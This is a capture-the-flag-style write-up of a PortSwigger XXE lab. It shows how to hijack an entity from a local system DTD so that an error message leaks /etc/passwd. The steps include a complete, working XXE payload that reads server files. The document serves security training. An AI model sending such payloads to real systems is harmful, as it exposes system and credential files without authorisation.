# Exploiting XXE - to retrieve data by repurposing a local DTD

## 📌 Lab Details
- **Title**: Exploiting XXE to retrieve data by repurposing a local DTD
- **Difficulty**: Expert
- **Category**: XML external entity injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/9179f60d7eff1096e159e290d8f14facb04543ccc4380aec40de3f603dbd8364?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-trigger-error-message-by-repurposing-local-dtd

## 🔍 Summary
This lab demonstrates how to **exploit XXE** vulnerabilities by **repurposing an existing local DTD** already present on the server. Instead of hosting your own DTD externally, you hijack an entity (like `ISOamso`) from a **known system DTD** (e.g., `/usr/share/yelp/dtd/docbookx.dtd`), and redefine it to extract sensitive files like `/etc/passwd`.

## 🛠 Steps to Solve
1. Intercept the "Check stock" **POST** request in Burp Suite.
2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
   ```sh
   <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```
3. This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.

## 📖 Key Takeaways
- XXE doesn't always need external DTDs — **local DTDs** already on the server can be leveraged.
- Useful for environments where **external network access is restricted**.
- Exploiting **parameter entities defined inside imported DTDs** is a powerful technique.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1b18137a-a116-4e56-b5fb-e9e0cdec2e6a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8b8dc46f-e93e-45ad-aa4a-80b1f447db7e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e0c1591c-8bc7-450a-b13e-51cede00aa20" />
